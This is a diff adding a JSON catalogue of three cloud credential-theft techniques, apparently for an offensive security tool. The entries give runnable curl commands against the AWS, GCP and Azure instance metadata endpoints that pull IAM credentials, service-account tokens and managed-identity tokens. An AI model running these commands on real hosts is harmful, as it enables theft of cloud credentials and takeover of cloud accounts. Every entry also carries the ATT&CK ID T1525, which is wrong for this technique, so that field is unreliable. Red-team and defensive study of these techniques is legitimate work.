@@ -1,0 +1,56 @@
+[
+  {
+    "id": "cloud-metadata-001",
+    "category": "cloud",
+    "subcategory": "cloud_metadata",
+    "title": "AWS IMDSv1 Credential Theft",
+    "description": "Exploit the AWS Instance Metadata Service (IMDS) to retrieve IAM credentials and tokens. IMDSv1 has no token requirement, making it trivially exploitable via SSRF or direct access.",
+    "techniques": [
+      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>",
+      "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
+      "curl http://169.254.169.254/latest/user-data/"
+    ],
+    "indicators": ["Running on AWS EC2", "IMDS accessible (169.254.169.254)", "IMDSv2 not enforced"],
+    "prerequisites": ["Code execution in AWS environment", "IMDS not blocked by firewall"],
+    "tools": ["curl", "wget"],
+    "tags": ["aws", "imds", "metadata", "credential-theft", "ssrf", "cloud"],
+    "confidence": 0.9,
+    "mitre_attack": "T1525"
+  },
+  {
+    "id": "cloud-metadata-002",
+    "category": "cloud",
+    "subcategory": "cloud_metadata",
+    "title": "GCP Metadata Service Exploitation",
+    "description": "Access GCP instance metadata to retrieve service account tokens and project information. Requires specific headers for v1 endpoint.",
+    "techniques": [
+      "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id",
+      "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
+    ],
+    "indicators": ["Running on GCP Compute Engine", "Metadata endpoint reachable"],
+    "prerequisites": ["Code execution in GCP environment", "Outbound HTTP access to metadata IP"],
+    "tools": ["curl", "gcloud"],
+    "tags": ["gcp", "metadata", "service-account", "credential-theft", "cloud"],
+    "confidence": 0.85,
+    "mitre_attack": "T1525"
+  },
+  {
+    "id": "cloud-metadata-003",
+    "category": "cloud",
+    "subcategory": "cloud_metadata",
+    "title": "Azure IMDS Token Extraction",
+    "description": "Query Azure Instance Metadata Service for managed identity tokens. Tokens can be used to access Azure resources as the VM's identity.",
+    "techniques": [
+      "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/'",
+      "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+      "az login --identity"
+    ],
+    "indicators": ["Running on Azure VM", "Managed identity assigned", "IMDS endpoint accessible"],
+    "prerequisites": ["Code execution in Azure VM", "Managed identity enabled on VM"],
+    "tools": ["curl", "az"],
+    "tags": ["azure", "imds", "managed-identity", "credential-theft", "cloud"],
+    "confidence": 0.85,
+    "mitre_attack": "T1525"
+  }
+]
